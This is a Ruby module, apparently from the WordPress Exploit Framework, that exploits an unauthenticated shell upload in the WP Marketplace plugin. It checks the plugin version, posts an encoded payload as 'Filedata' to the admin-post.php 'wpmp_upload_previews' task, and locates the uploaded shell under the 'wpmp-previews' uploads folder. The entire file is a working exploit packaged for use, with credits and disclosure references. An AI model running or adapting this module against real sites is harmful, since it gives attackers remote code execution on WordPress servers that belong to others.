# frozen_string_literal: true

class Wpxf::Exploit::WpMarketplaceShellUpload < Wpxf::Module
  include Wpxf::WordPress::ShellUpload

  def initialize
    super

    update_info(
      name: 'WP Marketplace Unauthenticated Shell Upload',
      author: [
        'White Fir Design', # Discovery and disclosure
        'rastating'         # WPXF module
      ],
      references: [
        ['WPVDB', '8642'],
        ['URL', 'http://labs.sucuri.net/?note=2016-10-17']
      ],
      date: 'Oct 14 2016'
    )
  end

  def check
    check_plugin_version_from_readme('wpmarketplace')
  end

  def uploader_url
    normalize_uri(wordpress_url_admin, 'admin-post.php?task=wpmp_upload_previews')
  end

  def payload_body_builder
    builder = Utility::BodyBuilder.new
    builder.add_file_from_string('Filedata', payload.encoded, payload_name)
    builder
  end

  def uploaded_payload_location
    normalize_uri(wordpress_url_uploads, 'wpmp-previews', upload_result.body)
  end
end
